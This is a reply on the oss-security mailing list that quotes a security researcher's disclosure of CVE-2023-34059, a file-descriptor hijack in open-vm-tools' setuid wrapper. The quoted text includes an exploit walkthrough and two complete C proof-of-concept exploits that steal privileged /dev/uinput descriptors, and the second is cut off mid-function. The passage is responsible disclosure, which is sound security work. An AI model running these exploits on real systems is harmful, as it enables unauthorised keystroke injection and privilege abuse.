Received: (qmail 32663 invoked by uid 550); 26 Nov 2023 19:56:21 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5123 invoked from network); 26 Nov 2023 19:39:04 -0000
Date: Sun, 26 Nov 2023 11:38:50 -0800
From: John Helmert III <ajak@gentoo.org>
To: oss-security@lists.openwall.com
Message-ID: <ZWOeyo-BtEAvbBXV@gentoo.org>
References: <AEBE0F32-EAA7-4BC5-ABDB-2EBA7B3046C9@vmware.com>
 <ZTuJmmJnWifdT1RJ@kasco.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="1g8waAmHLPemVDvN"
Content-Disposition: inline
In-Reply-To: <ZTuJmmJnWifdT1RJ@kasco.suse.de>
Subject: Re: [oss-security] CVE-2023-34059 - File Descriptor Hijack
 vulnerability in open-vm-tools

--1g8waAmHLPemVDvN
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On Fri, Oct 27, 2023 at 11:57:46AM +0200, Matthias Gerstner wrote:
> Hello list,
>=20
> I want to share my full report for this finding, please find it below.
>=20
> Introduction
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> During a routine review of the setuid-root binary
> "vmware-user-suid-wrapper" from the open-vm-tools [1] repository I
> discovered the vulnerability described in this report. The version under
> review was open-vm-tools version 12.2.0. The setuid-root binary's source
> code in the open-vm-tools repository did not change since version 10.3.0
> (released in 2018), however, so likely most current installations of
> open-vm-tools are affected by this finding.

Hm, it looks like there *was* a commit to vmware-user-suid-wrapper
that looks very similar to the patch that was linked in the original
advisory mail:

https://github.com/vmware/open-vm-tools/commit/63f7c79c4aecb14d37cc4ce9da50=
9419e31d394f

Was that fix insufficient, or maybe wasn't there when your mail was sent?

>=20
> Behaviour of vmware-user-suid-wrapper
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> On first look the vmware-user-suid-wrapper seems to be small and harmless:
>=20
> - it opens /dev/uinput as root, if it believes to be running on Wayland.
>   The latter is determined by inspecting the value of the environment
>   variable `XDG_SESSION_TYPE`, checking whether it is set to "wayland".
> - it opens /var/run/vmblock-fuse/dev, if existing, as `root`.
> - it permanently drops all privileges to the real (unprivileged) user
>   and group ids and executes /usr/bin/vmtoolsd, inheriting to it any of
>   the previously opened file descriptors.
> - the new `vmtoolsd` process will inspect the environment, e.g. check
>   whether the current host is running in a vmware guest environment and
>   whether a graphical session is available. If one of these is not
>   fulfilled then the process quickly terminates. On success the daemon
>   keeps running, providing its services, keeping the privileged file
>   descriptors open.
>=20
> So it seems everything is in order, the program opens up to two
> privileged files, drops privileges and passes the open files on to
> `vmtoolsd` to use them in the calling user's context.
>=20
> The Vulnerability
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> The (somewhat surprising) problem here is the combination of dropping
> privileges to the real uid / gid and the following `execve()` to execute
> the non-setuid program `vmtoolsd`. During the `execve()` the process's
> "dumpable" attribute is reset to the value of 1.
>=20
> From the man page `prctl(5)` we can learn the following about a
> process's dumpable attribute:
>=20
>     Normally, the "dumpable" attribute is set to 1. However, it is reset =
to
>     the current value contained in the file /proc/sys/fs/suid_dumpable (w=
hich by
>     default has the value 0), in the following circumstances:
>=20=20=20=20=20
>     [...]
>=20=20=20=20=20
>     - The process executes (execve(2)) a set-user-ID or set-group-ID prog=
ram,
>       resulting in a change of either the effective user ID or the effect=
ive
>       group ID.
>=20=20=20=20=20
>     [...]
>=20=20=20=20=20
>     Processes that are not dumpable can not be attached via ptrace(2)
>     PTRACE_ATTACH; see ptrace(2) for further details.
>=20
> On most Linux distributions the global `suid_dumpable` setting is set
> either to 0 (setuid programs may not dump core at all) or 2 (setuid
> programs may dump core but only in safe file system locations).
> Consequently when `vmware-user-suid-wrapper` runs, its dumpable
> attribute is set to 2 on openSUSE Tumbleweed, which I have been using
> while researching this issue. However after the `execve()` this changes,
> as is also documented in the `execve(2)` man page:
>=20
>     The following Linux-specific process attributes are also not preserved
>     during an execve():
>=20=20=20=20=20
>     - The process's "dumpable" attribute is set to the value 1, unless a
>       set-user-ID program, a set-group-ID program, or a program with
>       capabilities is being executed, [...].
>=20
> Consequently when `vmtoolsd` is executed with dropped privileges, the
> process's "dumpable" attribute will be reset to 1.
>=20
> The problem with this is that the unprivileged user that originally
> invoked `vmware-user-suid-wrapper` now is allowed to `ptrace()` the
> `vmtoolsd` process along with a number of other operations that have not
> been allowed on the setuid-root process before.
>=20
> The interesting resources that `vmtoolsd` has from a unprivileged user's
> perspective are the open file descriptors for /dev/uinput and/or
> /var/run/vmblock-fuse/dev. With the help of `ptrace()` malicious code
> could be injected into the `vmtoolsd` process to get access to the
> privileged file descriptors. An even easier approach is to use modern
> Linux's pidfd API `pidfd_open()` and `pidfd_getfd()` to obtain a copy of
> the privileged file descriptors. In the man page `pidfd_getfd(2)` we can
> find:
>=20
>     Permission to duplicate another process's file descriptor is governed=
 by a
>     ptrace access mode PTRACE_MODE_ATTACH_REALCREDS check (see ptrace(2)).
>=20
> In this context this again boils down to the process's "dumpable"
> attribute which is now set to 1, and thus the operation is allowed.
>=20
> Exploiting the Issue
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> `vmware-user-suid-wrapper` can be forced to open /dev/uinput even if not
> running on Wayland by setting the user controlled environment variable
> `XDG_SESSION_TYPE=3Dwayland`. This means the file descriptor for this
> device file will always be a valid attacker target independently of the
> actual situation on a system.
>=20
> There are two different scenarios to look at regarding the
> exploitability of the issue. The easier case is when a valid environment
> for `vmtoolsd` is available i.e. a graphical desktop session is existing
> and the check for running in a VMware guest machine is succeeding
> (function call `VMCheck_IsVirtualWorld()`). In this case `vmtoolsd` will
> continue running permanently and there is no race condition to be won.
> Exploiting the issue is straightforward, as is demonstrated in the
> attached PoC program `vmware-get-fd.c`.
>=20
> The more difficult case is when an attacker is either not running a
> graphical environment or not even running in a VMware guest environment.
> In the worst case `vmtoolsd` will terminate quickly, because of the
> failing `VMCheck_IsVirtualWorld()` check. Thus the time window for
> actually operating on the vulnerable process is short. A variant of the
> PoC program, `vmware-race-fd.c` is attached, which starts the
> `vmware-user-suid-wrapper` continuously and attempts to snatch the
> privileged file descriptors from the short-lived `vmtoolsd` process. In
> my tests this often succeeded quickly (even on the first attempt),
> likely when the `vmtoolsd` resources have not yet been cached by the
> kernel. Later attempts often take a longer time to succeed but still
> succeeded after 10 to 20 seconds.
>=20
> In summary the existence of the setuid-root program
> `vmware-user-suid-wrapper` is enough to exploit the issue for
> /dev/uinput. The attacker needs no special permissions (even the
> `nobody` user can exploit it) and the operating system doesn't even need
> to be running as a VMware guest. This can be relevant in situations when
> open-vm-tools are distributed by default in generic Linux distributions
> / images, or in environments where unprivileged users are allowed to
> install additional software from trusted sources without root
> authentication (a model that is e.g. supported by the PackageKit
> project).
>=20
> Vulnerability Impact
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> /dev/uinput
> -----------
>=20
> Getting access to a file descriptor for the /dev/uinput device allows an
> attacker to create arbitrary userspace based input devices and register
> them with the kernel. This includes the possibility to send synthesized
> key or mouse events to the kernel. The attached example program
> "uinput-inject.c" demonstrates how this can be used to cause arbitrary
> key strokes to be injected into local user sessions both graphical or on
> textual login consoles.  Thus this attack vector borders the area of
> arbitrary code execution with the restriction that a local interactive
> user needs to be present.
>=20
> This aspect of the vulnerability could be used to increase privileges
> after gaining low privilege access e.g. through a remote security hole.
> On multi user machines with shared access it could be used to prepare an
> attack where a background process waits for a victim user to log into
> the machine and then inject malicious input into its session.
>=20
> Since /dev/uinput is not VMware specific, this attack vector is
> basically also available in non-VMware environments.
>=20
> The following is an example exploit run using the attached programs, prov=
ided
> the `vmware-user-suid-wrapper` is already installed and a compiler is
> available:
>=20
>     user$ gcc -O2 vmware-race-fd.c -ovmware-race-fd
>     user$ gcc -O2 uinput-inject.c -ouinput-inject
>=20=20=20=20=20
>     user$ ./vmware-race-fd
>     vmware-user: could not open /proc/fs/vmblock/dev
>     vmware-user: could not open /proc/fs/vmblock/dev
>     [...]
>     /usr/bin/vmtoolsd running at 12226
>     Found fd 3 for /dev/uinput in /usr/bin/vmtoolsd
>     Executing sub shell which will inherit the snatched file descriptor 4=
 (check /proc/self/fd)
>=20=20=20=20=20
>     user$ ls -l /proc/self/fd/4
>     l-wx------ 1 user group 64 Jul 25 13:43 /proc/self/fd/4 -> /dev/uinput
>=20=20=20=20=20
>     user$ ./uinput-inject 4
>     Sleeping 3 seconds for input subsystem to settle
>     completed one iteration
>     completed one iteration
>=20
> This will continuously write the line "you have been hacked" onto
> whatever session is currently selected on the system's display.
>=20
> /var/run/vmblock-fuse/dev
> -------------------------
>=20
> As far as I understand, this file is created by the `vmware-vmblock-fuse`
> daemon and represents a control file. The FUSE file system is used to
> implement access to folders shared between the VMware host and VMware gue=
sts.
> This file allows, according to documentation [5], to add, delete or list
> blocks in shared folders.
>=20
> As a result access to this file descriptor breaks the boundary between
> different users in the guest system regarding shared folder access.  The
> integrity of the shared folder content can be violated. It might also be
> possible to leak information from shared folders into the unprivileged
> user's context.
>=20
> Depending on the actual environment it might allow to result in code
> execution if e.g. malicious code is written to shared folders that could
> then be executed even on the VMware host system.
>=20
> The vmware-fuse documentation [5] mentions the outlook to allow
> unprivileged users access to this control file, but this idea seems not
> safe to me in its current form.
>=20
> I did not look more closely into practical exploits of this.
>=20
> Suggested Fix
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> To fix this problem it must be prevented that the "dumpable" attribute
> of the `vmware-user-suid-wrapper` process is reset when executing
> `vmtoolsd`. One way to achieve this could be to move the privilege drop
> logic into `vmtoolsd` instead. As long as the process is running in the
> setuid-root context, the "dumpable" attribute will not be reset.
> `vmtoolsd` can then drop privileges and also mark the privileged file
> descriptors with the `O_CLOEXEC` flag to prevent them to be inherited
> unintendedly to further child processes, which might result in the same
> problem again.
>=20
> Update: This is the route that the patch provided by upstream has taken.
>=20
> As a first aid and/or hardening measure, access to the
> `vmware-user-suid-wrapper` could be limited to members of a privileged
> group e.g. vmware-users. This would reduce the attack surface and
> prevent e.g. a compromised `nobody` user account to exploit this.
>=20
> In terms of hardening, the `vmware-user-suid-wrapper` could also add
> some code to sanitize the environment variables passed from the
> unprivileged context, which is a frequent source of security issues in
> setuid-root binaries. At least the PATH variable should be reset to a
> safe value to avoid any future surprises when looking up executable for
> `execve()`.
>=20
> Timeline
> =3D=3D=3D=3D=3D=3D=3D=3D
>=20
> 2023-07-25: I reported the findings to security@vmware.com, offering
>             coordinated disclosure.
> 2023-08-23: VMware security asked for a publication date in early November
>             exceeding our maximum 90 days disclosure policy. We reluctant=
ly
>             agreed to this exception.
> 2023-10-20: VMware shared the issue and bugfixes with the distros mailing=
 list
> 	    without keeping me in the loop. In parallel an earlier publication
>             of 2023-10-26 has now been communicated to me. My requests
> 	    to get a draft patch for review before publication have not
> 	    been honored.
> 2023-10-27: The general publication date has been reached.
>=20
> References
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> [1]: https://github.com/vmware/open-vm-tools
> [2]: https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/vm=
ware-user-suid-wrapper
> [3]: https://en.opensuse.org/openSUSE:Security_disclosure_policy
> [4]: https://www.openwall.com/lists/oss-security/
> [5]: https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/vm=
block-fuse/design.txt
>=20
> --=20
> Matthias Gerstner <matthias.gerstner@suse.de>
> Security Engineer
> https://www.suse.com/security
> GPG Key ID: 0x14C405C971923553
>=20=20
> SUSE Software Solutions Germany GmbH
> HRB 36809, AG N=FCrnberg
> Gesch=E4ftsf=FChrer: Ivo Totev, Andrew McDonald, Werner Knoblich

> /*
>  * Matthias Gerstner (matthias.gerstner@suse.de)
>  *
>  * 2023-07-24
>  *
>  * Proof of concept that shows a vulnerability in the setuid-root program
>  * `vmware-user-suid-wrapper` which is part of the open-vm-tools project.
>  *
>  * The setuid-root program opens the following files using root privilege=
s:
>  *
>  * - /dev/uinput
>  * - /run/vmblock-fuse/dev
>  *
>  * then drops root privileges and executes the vmtoolsd daemon.
>  *
>  * On Linux this privilege drop means that other unprivileged processes o=
wned
>  * by the real UID of the process can now ptrace() vmtoolsd and perform o=
ther
>  * privileged operations to obtain the already opened privileged files.
>  *
>  * This proof of concept obtains the desired file descriptor (specified as
>  * command line argument, by default /dev/uinput) by using pidfd_getfd() =
on an
>  * already running vmtoolsd. This works only if the system is a vmware gu=
est
>  * system and you are logged into a graphical environment where vmtoolsd
>  * detects no errors and stays running.
>  *
>  * If this criteria is matched then this proof of concept will always suc=
ceed,
>  * there is no race involved.
>  */
>=20
> #include <ctype.h>
> #include <dirent.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <signal.h>
> #include <stdbool.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <unistd.h>
>=20
> #define VMTOOLSD "/usr/bin/vmtoolsd"
>=20
> extern char **environ;
> struct stat st;
> char sbuf[1024];
>=20
> /* system call wrappers since the pidfd family of functions does not yet =
have
>  * wrappers in glibc */
>=20
> int pidfd_open(pid_t pid) {
> 	return syscall(SYS_pidfd_open, pid, 0);
> }
>=20
> int pidfd_send_signal(int pidfd, int sig) {
> 	return syscall(SYS_pidfd_send_signal, pidfd, sig, NULL, 0);
> }
>=20
> int pidfd_getfd(int pidfd, int targetfd) {
> 	return syscall(SYS_pidfd_getfd, pidfd, targetfd);
> }
>=20
> // convert a string representing an integer to and int, returns operation=
 success flag
> bool stoint(const char *s, int *out) {
> 	int items =3D sscanf(s, "%d", out);
>=20
> 	return items > 0;
> }
>=20
> bool is_dir(int dir_fd, struct dirent *ent) {
> 	if (ent->d_type =3D=3D DT_DIR) {
> 		return true;
> 	} else if (ent->d_type !=3D DT_UNKNOWN) {
> 		return false;
> 	}
>=20
> 	if (fstatat(dir_fd, ent->d_name, &st, 0) !=3D 0) {
> 		switch (errno) {
> 			case ENOENT: // race
> 			case EPERM: // not owned by us
> 			case EACCES:
> 				return false;
> 			default:
> 				perror("fstat(): /proc/<pid>");
> 				exit(1);
> 		}
> 	}
>=20
> 	return (st.st_mode & S_IFMT) =3D=3D S_IFDIR;
> }
>=20
> void build_proc_exe_path(const char *pid) {
> 	int req =3D snprintf(sbuf, sizeof(sbuf), "/proc/%s/exe", pid);
>=20
> 	if (req < 0 || (size_t)req >=3D sizeof(sbuf)) {
> 		fprintf(stderr, "snprintf overflow\n");
> 		exit(1);
> 	}
> }
>=20
> /*
>  * finds out the PID for the daemon running the executable defined in
>  * `VMTOOLSD`. On error -1 is returned.
>  */
> pid_t find_daemon() {
> 	pid_t ret =3D -1;
> 	DIR *proc =3D opendir("/proc");
> 	struct dirent *ent =3D NULL;
> 	char target[PATH_MAX];
>=20
> 	if (!proc) {
> 		perror("opendir(): /proc");
> 		exit(1);
> 	}
>=20
> 	int proc_fd =3D dirfd(proc);
>=20
> 	while ((ent =3D readdir(proc)) !=3D NULL) {
> 		if (!isdigit(ent->d_name[0]))
> 			continue;
> 		else if (!is_dir(proc_fd, ent))
> 			continue;
>=20
> 		build_proc_exe_path(ent->d_name);
>=20
> 		int written =3D readlink(sbuf, target, sizeof(target));
>=20
> 		if (written < 0 ) {
> 			switch (errno) {
> 				case EPERM: // not owned by us
> 				case EACCES:
> 					continue;
> 				default:
> 					break;
> 			}
> 			perror("readlink(): /proc/<pid>/exe");
> 		} else if ((size_t)written >=3D sizeof(target)) {
> 			fprintf(stderr, "readlink(): buffer truncation occured");
> 			exit(1);
> 		}
>=20
> 		target[written] =3D '\0';
>=20
> 		if (strcmp(target, VMTOOLSD) =3D=3D 0) {
> 			if (!stoint(ent->d_name, &ret)) {
> 				perror("parsing vmblockd pid");
> 				exit(1);
> 			}
> 		}
> 	}
>=20
> 	closedir(proc);
>=20
> 	return ret;
> }
>=20
> /*
>  * Returns the number of the file descriptor matching the given
>  * `searched_path` in the daemon process running under PID `daemon_pid`
>  *=20
>  * On error -1 is returned.
>  */
> int find_target_fd(int daemon_pid, const char *searched_path) {
>=20
> 	int req =3D snprintf(sbuf, sizeof(sbuf), "/proc/%d/fd", daemon_pid);
>=20
> 	if (req < 0 || (size_t)req >=3D sizeof(sbuf)) {
> 		fprintf(stderr, "snprintf overflow\n");
> 		exit(1);
> 	}
>=20
> 	struct dirent *ent =3D NULL;
> 	DIR *fd_dir =3D opendir(sbuf);
>=20
> 	if (!fd_dir) {
> 		perror("opendir(): /proc/<pid>/fd");
> 		return -1;
> 	}
>=20
> 	int fd_num =3D -1;
> 	int fd_dir_fd =3D dirfd(fd_dir);
>=20
> 	while ((ent =3D readdir(fd_dir)) !=3D NULL) {
> 		if (!stoint(ent->d_name, &fd_num))
> 			continue;
>=20
> 		ssize_t len =3D readlinkat(fd_dir_fd, ent->d_name, sbuf, sizeof(sbuf));
>=20
> 		if (len < 0)
> 			continue;
>=20
> 		sbuf[len] =3D '\0';
>=20
> 		if (strcmp(sbuf, searched_path) =3D=3D 0) {
> 			break;
> 		}
> 	}
>=20
> 	closedir(fd_dir);
>=20
> 	return fd_num;
> }
>=20
> /**
>  * Performs the complete operational sequence of:
>  *
>  * - finding out the VMTOOLSD daemon's PID
>  * - stopping the daemon to prevent further races
>  * - finding the target file descriptor for the file specified on the com=
mand
>  *   line
>  * - duplicating this file descriptor from the VMTOOLS daemon
>  * - resuming the daemon's operation
>  *
>  * returns the snatched fd or -1 if none could be obtained.
>  **/
> int try_snatch_fd(const char *snatch_fd_path) {
> 	pid_t daemon_pid =3D find_daemon();
>=20
> 	if (daemon_pid < 0) {
> 		printf("failed to find %s process\n", VMTOOLSD);
> 		return -1;
> 	} else {
> 		printf("%s running at %d\n", VMTOOLSD, daemon_pid);
> 	}
>=20
> 	int daemon_file =3D pidfd_open(daemon_pid);
>=20
> 	if (daemon_file < 0) {
> 		perror("pidfd_open(<vmtoolsd>)");
> 		return -1;
> 	}
>=20
> 	// stop the daemon so we can continue working with in peace without
> 	// fear of it meanwhile exiting
> 	pidfd_send_signal(daemon_pid, SIGSTOP);
>=20
> 	int daemon_fd_num =3D find_target_fd(daemon_pid, snatch_fd_path);
>=20
> 	int snatched_fd =3D -1;
>=20
> 	if (daemon_fd_num < 0) {
> 		fprintf(stderr, "failed to find fd to snatch (%s)", snatch_fd_path);
> 	} else {
> 		printf("Found fd %d for %s in %s\n", daemon_fd_num, snatch_fd_path, VMT=
OOLSD);
> 		snatched_fd =3D pidfd_getfd(daemon_file, daemon_fd_num);
>=20
> 		if (snatched_fd < 0) {
> 			perror("failed to snatch fd: pidfd_get_fd()");
> 		}
> 	}
>=20
> 	// let the daemon continue running
> 	pidfd_send_signal(daemon_pid, SIGCONT);
>=20
> 	close(daemon_file);
>=20
> 	return snatched_fd;
> }
>=20
> void run_subshell(int snatched_fd) {
> 	// reset the O_CLOEXEC flag, which is always set by pidfd_getfd.
> 	fcntl(snatched_fd, F_SETFD, 0);
> 	// execute new sub shell owning the snatched file descriptor
> 	printf("Executing sub shell which will inherit the snatched file descrip=
tor %d (check /proc/self/fd)\n", snatched_fd);
> 	const char *argv[] =3D {"/bin/bash", NULL};
> 	execve("/bin/bash", (void*)argv, environ);
> 	perror("execve(bash)");
> }
>=20
> int main(int argc, const char **argv) {
> 	const char *snatch_fd_path =3D argc =3D=3D 2 ? argv[1] : "/dev/uinput";
>=20
> 	int snatched_fd =3D try_snatch_fd(snatch_fd_path);
>=20
> 	if (snatched_fd < 0) {
> 		return 1;
> 	}
>=20
> 	run_subshell(snatched_fd);
> 	return 1;
> }

> /*
>  * Matthias Gerstner (matthias.gerstner@suse.de)
>  *
>  * 2023-07-24
>  *
>  * Proof of concept that shows a vulnerability in the setuid-root program
>  * `vmware-user-suid-wrapper` which is part of the open-vm-tools project.
>  *
>  * The setuid-root program opens the following files using root privilege=
s:
>  *
>  * - /dev/uinput
>  * - /run/vmblock-fuse/dev
>  *
>  * then drops root privileges and executes the vmtoolsd daemon.
>  *
>  * On Linux this privilege drop means that other unprivileged processes o=
wned
>  * by the real UID of the process can now ptrace() vmtoolsd and perform o=
ther
>  * privileged operations to obtain the already opened privileged files.
>  *
>  * This proof of concept invokes `vmware-user-suid-wrapper` and attempts =
to
>  * win a race condition to snatch the desired file descriptor  from a
>  * (possibly short living) vmtoolsd grand child process.
>  *
>  * The file descriptor to snatch is determined by the single command line
>  * argument (/dev/uinput by default). This variant of the exploit shows t=
hat
>  * exploiting the vulnerability is also possible in non-graphical
>  * environments, for users without any special capabilities (like `nobody=
`)
>  * and even on non-vmware hosts.
>  */
>=20
> #include <ctype.h>
> #include <dirent.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <signal.h>
> #include <stdbool.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <unistd.h>
>=20
> #define VMTOOLSD "/usr/bin/vmtoolsd"
> #define FATAL_EXIT 10
>=20
> extern char **environ;
> struct stat st;
> char sbuf[PATH_MAX];
> pid_t wrapper_child_pid =3D -1;
>=20
> /* system call wrappers since the pidfd family of functions does not yet =
have
>  * wrappers in glibc */
>=20
> static int pidfd_open(pid_t pid) {
> 	return syscall(SYS_pidfd_open, pid, 0);
> }
>=20
> static int pidfd_send_signal(int pidfd, int sig) {
> 	return syscall(SYS_pidfd_send_signal, pidfd, sig, NULL, 0);
> }
>=20
> static int pidfd_getfd(int pidfd, int targetfd) {
> 	return syscall(SYS_pidfd_getfd, pidfd, targetfd);
> }
>=20
> static void exec_prog(const char *path) {
> 	const char *argv[] =3D {path, NULL};
> 	execve(path, (void*)argv, environ);
> 	fprintf(stderr, "%s: ", path);
> 	perror("execve()");
> 	_exit(FATAL_EXIT);
> }
>=20
> static void prepare_wrapper() {
> 	wrapper_child_pid =3D fork();
>=20
> 	if (wrapper_child_pid =3D=3D 0) {
> 		// wait until we're asked to actually continue
> 		raise(SIGSTOP);
> 		// make sure /dev/uinput is also opened by the setuid-wrapper.
> 		setenv("XDG_SESSION_TYPE", "wayland", 1);
> 		exec_prog("/usr/bin/vmware-user-suid-wrapper");
> 	} else {
> 		int status =3D 0;
>=20
> 		do {
> 			if (waitpid(wrapper_child_pid, &status, WUNTRACED) < 0) {
> 				perror("waitpid()");
> 				exit(1);
> 			}
> 		} while (!WIFSTOPPED(status));
> 	}
> }
>=20
> static void kickoff_wrapper() {
> 	kill(wrapper_child_pid, SIGCONT);
> }
>=20
> static void collect_wrapper() {
> 	if (wrapper_child_pid < 0)
> 		return;
>=20
> 	int status =3D 0;
>=20
> 	do {
> 		if (waitpid(wrapper_child_pid, &status, 0) < 0) {
> 			perror("waitpid(wrapper)");
> 		}
> 	} while (!WIFEXITED(status));
>=20
> 	wrapper_child_pid =3D -1;
>=20
> 	if (WEXITSTATUS(status) =3D=3D FATAL_EXIT) {
> 		fprintf(stderr, "wrapper child process encountered fatal error\n");
> 		exit(1);
> 	}
> }
>=20
>=20
> // convert a string representing an integer to and int, returns operation=
 success flag
> static bool stoint(const char *s, int *out) {
> 	int items =3D sscanf(s, "%d", out);
>=20
> 	return items > 0;
> }
>=20
> static bool is_dir(int dir_fd, struct dirent *ent) {
> 	if (ent->d_type =3D=3D DT_DIR) {
> 		return true;
> 	} else if (ent->d_type !=3D DT_UNKNOWN) {
> 		return false;
> 	}
>=20
> 	if (fstatat(dir_fd, ent->d_name, &st, 0) !=3D 0) {
> 		switch (errno) {
> 			case ENOENT: // race
> 			case EPERM: // not owned by us
> 			case EACCES:
> 				return false;
> 			default:
> 				perror("fstat(): /proc/<pid>");
> 				exit(1);
> 		}
> 	}
>=20
> 	return (st.st_mode & S_IFMT) =3D=3D S_IFDIR;
> }
>=20
> static void build_proc_exe_path(const char *pid) {
> 	int req =3D snprintf(sbuf, sizeof(sbuf), "/proc/%s/exe", pid);
>=20
> 	if (req < 0 || (size_t)req >=3D sizeof(sbuf)) {
> 		fprintf(stderr, "snprintf overflow\n");
> 		exit(1);
> 	}
> }
>=20
> /*
>  * finds out the PID for the daemon running the executable defined in
>  * `VMTOOLSD`. On error -1 is returned.
>  *
>  * To reduce the amount of system calls required to walk through /proc th=
is
>  * function employ a heuristic assuming that the grand-child process will
>  * receive a PID close to `wrapper_child_pid`.
>  */
> static pid_t find_daemon() {
> 	pid_t ret =3D -1;
> 	DIR *proc =3D opendir("/proc");
> 	struct dirent *ent =3D NULL;
> 	char target[PATH_MAX];
>=20
> 	if (!proc) {
> 		perror("opendir(): /proc");
> 		return ret;
> 	}
>=20
> 	pid_t cur_pid =3D -1;
> 	int proc_fd =3D dirfd(proc);
>=20
> 	kickoff_wrapper();
>=20
> 	while ((ent =3D readdir(proc)) !=3D NULL) {
> 		if (!stoint(ent->d_name, &cur_pid))
> 			continue;
> 		else if (!is_dir(proc_fd, ent))
> 			continue;
> 		// this is a bit of heuristics but it should reduce the amount
> 		// of system calls we require to catch a short-living vmtoolsd
> 		// significantly
> 		else if (cur_pid < wrapper_child_pid || cur_pid > (wrapper_child_pid + =
50))
> 			continue;
>=20
> 		build_proc_exe_path(ent->d_name);
>=20
> 		int written =3D readlink(sbuf, target, sizeof(target));
>=20
> 		if (written < 0) {
> 			switch (errno) {
> 				case EPERM: // not owned by us
> 				case EACCES:
> 					continue;
> 				default:
> 					break;
> 			}
> 			printf("readlink(): /proc/%s/exe failed\n", ent->d_name);
> 		} else if ((size_t)written >=3D sizeof(target)) {
> 			fprintf(stderr, "readlink(): buffer truncation occured");
> 			exit(1);
> 		}
>=20
> 		target[written] =3D '\0';
>=20
> 		if (strcmp(target, VMTOOLSD) =3D=3D 0) {
> 			ret =3D cur_pid;
> 			break;
> 		}
> 	}
>=20
> 	closedir(proc);
>=20
> 	return ret;
> }
>=20
> /*
>  * Returns the number of the file descriptor matching the given
>  * `searched_path` in the daemon process running under PID `daemon_pid`
>  *=20
>  * On error -1 is returned.
>  */
> static int find_target_fd(int daemon_pid, const char *searched_path) {
>=20
> 	int req =3D snprintf(sbuf, sizeof(sbuf), "/proc/%d/fd", daemon_pid);
>=20
> 	if (req < 0 || (size_t)req >=3D sizeof(sbuf)) {
> 		fprintf(stderr, "snprintf overflow\n");
> 		exit(1);
> 	}
>=20
> 	struct dirent *ent =3D NULL;
> 	DIR *fd_dir =3D opendir(sbuf);
>=20
> 	if (!fd_dir) {
> 		perror("opendir(): /proc/<vmtoolsd-pid>/fd");
> 		return -1;
> 	}
>=20
> 	int fd_num =3D -1;
> 	int fd_dir_fd =3D dirfd(fd_dir);
>=20
> 	while ((ent =3D readdir(fd_dir)) !=3D NULL) {
> 		if (!stoint(ent->d_name, &fd_num))
> 			continue;
>=20
> 		ssize_t len =3D readlinkat(fd_dir_fd, ent->d_name, sbuf, sizeof(sbuf));
>=20
> 		if (len < 0)
> 			continue;
>=20
> 		sbuf[len] =3D '\0';
>=20
> 		if (strcmp(sbuf, searched_path) =3D=3D 0) {
> 			break;
> 		}
> 	}
>=20
> 	closedir(fd_dir);
>=20
> 	return fd_num;
> }
>=20
> /**
>  * Performs the operational sequence of:
>  *
>  * - stopping the daemon to prevent further races
>  * - finding the target file descriptor for the file specified on the com=
mand
>  *   line
>  * - duplicating this file descriptor from the VMTOOLS daemon
>  * - resuming the daemon's operation
>  *
>  * returns the snatched fd or -1 if none could be obtained.
>  **/
> static int try_snatch_fd(pid_t daemon_pid, const char *snatch_fd_path) {
>=20
> 	if (daemon_pid < 0) {
> 		printf("failed to find %s process\n", VMTOOLSD);
> 		return -1;
> 	} else {
> 		printf("%s running at %d\n", VMTOOLSD, daemon_pid);
> 	}
>=20
> 	int daemon_file =3D pidfd_open(daemon_pid);
>=20
> 	if (daemon_file < 0) {
> 		perror("pidfd_open(<vmtoolsd>)");
> 		return -1;
> 	}
>=20
> 	// stop the daemon so we can continue working with in peace without
> 	// fear of it meanwhile exiting
> 	pidfd_send_signal(daemon_pid, SIGSTOP);
>=20
> 	int daemon_fd_num =3D find_target_fd(daemon_pid, snatch_fd_path);
>=20
> 	int snatched_fd =3D -1;
>=20
> 	if (daemon_fd_num < 0) {
> 		fprintf(stderr, "failed to find fd to snatch (%s)", snatch_fd_path);
> 	} else {
> 		printf("Found fd %d for %s in %s\n", daemon_fd_num, snatch_fd_path, VMT=
OOLSD);
> 		snatched_fd =3D pidfd_getfd(daemon_file, daemon_fd_num);
>=20
> 		if (snatched_fd < 0) {
> 			perror("failed to snatch fd: pidfd_get_fd()");
> 		}
> 	}
>=20
> 	// let the daemon continue running
> 	pidfd_send_signal(daemon_pid, SIGCONT);
>=20
> 	close(daemon_file);
>=20
> 	return snatched_fd;
> }
>=20
> static void run_subshell(int snatched_fd) {
> 	// reset the O_CLOEXEC flag, which is always set by pidfd_getfd.
> 	fcntl(snatched_fd, F_SETFD, 0);
> 	// execute new sub shell owning the snatched file descriptor
